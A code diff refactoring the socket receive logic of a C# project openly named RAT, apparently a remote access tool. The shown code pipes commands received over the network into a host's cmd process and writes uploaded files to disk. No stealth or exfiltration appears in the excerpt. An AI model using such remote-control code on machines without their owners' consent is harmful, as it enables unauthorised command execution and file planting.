@@ -41,35 +41,44 @@ namespace RAT.src.Logic.Sockets.Connection
         }
 
         /// <summary>
-        /// Wrapper for initial command receive, any data starts from here.
+        /// Wrapper for command receive.
         /// </summary>
         /// <param name="socket">Our connection.</param>
-        public void BeginDataReceive(Socket socket)
+        public void BeginCommandReceive(Socket socket)
         {
             var clientState = _socketStateLogic.State;
-            if (clientState.CurrentOperation == CurrentOperation.FileUpload)
+            socket.BeginReceive(clientState.CommandDataArray, 0, clientState.CommandDataArray.Length, 0, OnCommandReceive, clientState);
+        }
+
+        /// <summary>
+        /// Wrapper for file data receive.
+        /// </summary>
+        /// <param name="socket">Our connection.</param>
+        public void BeginFileDataReceive(Socket socket)
+        {
+            var clientState = _socketStateLogic.State;
+            if (clientState.FileUploadInformation.FileUploadProgress == FileUploadProgress.Begins ||
+                clientState.FileUploadInformation.FileUploadProgress == FileUploadProgress.InProgress)
             {
-                socket.BeginReceive(clientState.FileDataArray, 0, clientState.FileDataArray.Length, 0, OnFileDataReceive, clientState);
-            }
-            else
-            {
-                socket.BeginReceive(clientState.CommandDataArray, 0, clientState.CommandDataArray.Length, 0, OnCommandReceive, clientState);
+                socket.BeginReceive(clientState.FileUploadInformation.FileDataArray, 0, clientState.FileUploadInformation.FileDataArray.Length, 0, OnFileDataReceive, clientState);
             }
         }
 
         /// <summary>
         /// Command receival logic handling.
         /// </summary>
-        /// <param name="res">Status of asynchronous operation.</param>
-        private void OnCommandReceive(IAsyncResult res)
+        /// <param name="asyncResult">Status of asynchronous operation.</param>
+        private void OnCommandReceive(IAsyncResult asyncResult)
         {
             // Read data from the client socket.
-            StateObject state = _socketStateLogic.GetStateFromAsyncResult(res);
-            int bytesRead = this.EndDataReceiveAndGetRecevedBytesCount(res, state);
+            StateObject state = _socketStateLogic.GetStateFromAsyncResult(asyncResult);
+            int bytesRead = this.EndReceiveAndGetReceivedBytesCount(state.ClientMainSocket, asyncResult);
 
             // There might be more data, so store the data received so far.
             state.DataBuilder.Append(Encoding.ASCII.GetString(state.CommandDataArray, 0, bytesRead));
             string content = state.DataBuilder.ToString();
+
+            // Check if data was received at all.
             if (string.IsNullOrEmpty(content) && state.DataBuilder.Length == 0)
             {
                 return;
@@ -80,26 +89,27 @@ namespace RAT.src.Logic.Sockets.Connection
             if (!content.Contains("\n"))
             {
                 // Not all data received. Get more.
-                this.BeginDataReceive(state.ClientMainSocket);
+                this.BeginCommandReceive(state.ClientMainSocket);
             }
             else
             {
-                this.HandleClientRequest(state);
+                this.ProceedWithCommandExecution(state);
             }
         }
 
         /// <summary>
         /// File data receival logic handling.
         /// </summary>
-        /// <param name="res">Status of asynchronous operation.</param>
-        private void OnFileDataReceive(IAsyncResult res)
+        /// <param name="asyncResult">Status of asynchronous operation.</param>
+        private void OnFileDataReceive(IAsyncResult asyncResult)
         {
             // Read data from the client socket.
-            StateObject state = _socketStateLogic.GetStateFromAsyncResult(res);
-            int bytesReceved = this.EndDataReceiveAndGetRecevedBytesCount(res, state);
+            StateObject state = _socketStateLogic.GetStateFromAsyncResult(asyncResult);
+            int bytesReceved = this.EndReceiveAndGetReceivedBytesCount(state.FileUploadInformation.ClientFileUploadSocket, asyncResult);
+            var fileData = state.FileUploadInformation.FileDataArray;
 
-            // No data received.
-            if (bytesReceved == 0 && state.FileDataArray.Length == 0)
+            // Check if some data was received at all.
+            if (bytesReceved == 0 && fileData.Length == 0)
             {
                 return;
             }
@@ -107,17 +117,33 @@ namespace RAT.src.Logic.Sockets.Connection
             if (bytesReceved > 0)
             {
                 // Preserving uploaded data in string format.
-                string resultInStringFormat = Convert.ToBase64String(state.FileDataArray);
-                state.FileDataBuilder.Append(resultInStringFormat);
+                string resultInStringFormat = Convert.ToBase64String(fileData);
+                state.FileUploadInformation.FileDataBuilder.Append(resultInStringFormat);
 
                 // Continue on receiving data.
-                this.BeginDataReceive(state.ClientFileUploadSocket);
+                this.BeginFileDataReceive(state.FileUploadInformation.ClientFileUploadSocket);
             }
             else
             {
-                // Upload finished.
-                state.CurrentOperation = CurrentOperation.None;
-                _fileUploader.UploadFile(state.PathForFileUpload, Convert.FromBase64String(state.FileDataBuilder.ToString()));
+                // Upload finished, proceed with closing connection on file upload socket and writing file to PC.
+                state.FileUploadInformation.FileUploadProgress = FileUploadProgress.Finished;
+                _socketConnectionDisconnectLogic.DisconnectSocket(state.FileUploadInformation.ClientFileUploadSocket);
+
+                string fileDataInStringFormat = state.FileUploadInformation.FileDataBuilder.ToString();
+                byte[] downloadedData = new byte[0];
+                try
+                {
+                    downloadedData = Convert.FromBase64String(fileDataInStringFormat);
+                }
+                // If base64 string is badly formatted - we received bad data, possibly wrong file size was provided.
+                catch (Exception exception)
+                {
+                    _notificationLogic.NotifyClient($"Error: received malformed data, message: {exception.Message}");
+                    return;
+                }
+
+                _fileUploader.UploadFile(
+                    state.FileUploadInformation.PathForFileUpload, downloadedData);
             }
         }
 
@@ -125,19 +151,19 @@ namespace RAT.src.Logic.Sockets.Connection
         /// Handles client request after data is red.
         /// </summary>
         /// <param name="clientState">Current client state.</param>
-        private void HandleClientRequest(StateObject clientState)
+        private void ProceedWithCommandExecution(StateObject clientState)
         {
-            var potentialCommand = clientState.DataBuilder.ToString();
+            var command = clientState.DataBuilder.ToString();
 
             // Check if this is RAT related command
-            if (_ratCommandLogic.IsRatCommand(potentialCommand))
+            if (_ratCommandLogic.IsRatCommand(command))
             {
-                _ratCommandLogic.HandleRatCommand(potentialCommand);
+                _ratCommandLogic.HandleRatCommand(command);
             }
             else
             {
                 // Execute cmd command.
-                clientState.ClientCmdProcess.StandardInput.WriteLine(potentialCommand);
+                clientState.ClientCmdProcess.StandardInput.WriteLine(command);
             }
 
             // Clear state data after command execution.
@@ -145,40 +171,28 @@ namespace RAT.src.Logic.Sockets.Connection
             clientState.CommandDataArray = new byte[1024]; // Command is stored here in byte command.
 
             // Continue on listening for other commands.
-            this.BeginDataReceive(clientState.ClientMainSocket);
+            this.BeginCommandReceive(clientState.ClientMainSocket);
         }
 
         /// <summary>
         /// Ends data receival and gets bytes received.
         /// </summary>
-        /// <param name="res">Status of asynchronous operation.</param>
-        /// <param name="state">Current client state.</param>
+        /// <param name="socket">Socket to get bytes count from.</param>
+        /// <param name="result">Status of asynchronous operation.</param>
         /// <returns>Bytes received.</returns>
-        private int EndDataReceiveAndGetRecevedBytesCount(IAsyncResult res, StateObject state)
+        private int EndReceiveAndGetReceivedBytesCount(Socket socket, IAsyncResult result)
         {
-            // ---- TEMP
             int bytesReceved = 0;
             try
             {
-                if (state.CurrentOperation == CurrentOperation.FileUpload)
-                {
-                    bytesReceved = state.ClientFileUploadSocket.EndReceive(res);
-                }
-                else
-                {
-                    bytesReceved = state.ClientMainSocket.EndReceive(res);
-                }
+                bytesReceved = socket.EndReceive(result);
             }
             catch (Exception exception)
             {
-                // If some error occured during receival, then we are disconnecting client but preserving socket and connection,
-                // so he could connect again immediately (in case if some error occured on his side).
-                _socketConnectionDisconnectLogic.DisconnectFromMainSocket(state.ClientMainSocket);
                 _notificationLogic.NotifyClient($"Error during data receive: {exception.Message}");
             }
 
             return bytesReceved;
-            // ---- TEMP
         }
     }
 }
